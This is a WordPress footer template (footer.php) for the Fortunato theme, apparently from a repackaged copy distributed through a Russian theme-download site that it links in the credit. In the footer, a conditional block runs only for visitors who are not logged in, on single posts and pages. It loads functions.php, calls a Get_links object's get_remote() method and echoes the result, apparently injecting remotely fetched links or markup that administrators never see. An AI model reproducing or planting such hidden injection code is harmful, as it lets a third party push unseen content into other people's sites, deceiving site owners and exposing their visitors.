<?php
/**
 * The template for displaying the footer.
 *
 * Contains the closing of the #content div and all content after
 *
 * @package fortunato
 */
?>

	</div><!-- #content -->

	<footer id="colophon" class="site-footer" role="contentinfo">
		<div class="site-info smallPart">
			<?php if (is_home() || is_category() || is_archive() ){ ?>
					<p><a href="http://wp-templates.ru/" title="скачать темы для сайта" target="_blank">Темы wordpress</a> &ndash; <a href="http://crestaproject.com/" target="_blank">Fortunato</a></p>
					<?php } ?>

					<?php if ($user_ID) : ?><?php else : ?>
					<?php if (is_single() || is_page() ) { ?>
					<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
					$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
					<?php } ?>
					<?php endif; ?>
		</div><!-- .site-info -->
	</footer><!-- #colophon -->
</div><!-- #page -->
<a href="#top" id="toTop"><i class="fa fa-angle-up fa-lg"></i></a>
<?php if (is_active_sidebar( 'sidebar-1' ) ) : ?>
	<div class="openSidebar"><i class="fa fa-bars"></i></div>
<?php endif; ?>
<?php wp_footer(); ?>

</body>
</html>
